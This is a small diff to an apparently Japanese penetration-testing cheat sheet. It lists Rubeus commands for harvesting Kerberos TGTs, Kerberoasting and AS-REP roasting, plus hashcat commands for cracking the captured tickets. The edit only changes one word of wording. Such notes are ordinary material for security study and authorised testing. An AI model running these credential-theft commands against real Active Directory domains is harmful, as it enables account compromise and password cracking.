@@ -68,7 +68,7 @@
   - 「`Rubeus.exe` harvest /interval:秒数」指定した秒数間、TGTを収集する  
   - 「`Rubeus.exe` kerberoast /nowrap /outfile:出力ファイル」  
     Kerberoasting（取得したユーザのSPNに対応したアカウントのTGSを取得できる）を実行（nowrapは改行なしで結果出力）  
-    TGSは「`hashcat` -a 0 -m 13100 TGSファイル Passwordリスト」でクラックできる（JohnではTGSをサポートしてない）
+    TGSは「`hashcat` -a 0 -m 13100 TGSファイル名 Passwordリスト」でクラックできる（JohnではTGSをサポートしてない）
   - 「`Rubeus.exe` asreproast /format:hashcat /outfile:出力ファイル」  
     ASREPRoast（Kerberos事前認証を必要としていないユーザのTGTを取得できる）を実行  
     ASREPは「`hashcat` -a 0 -m 18200 ASREPファイル Passwordリスト」でクラックできる（Johnでもクラックできる）
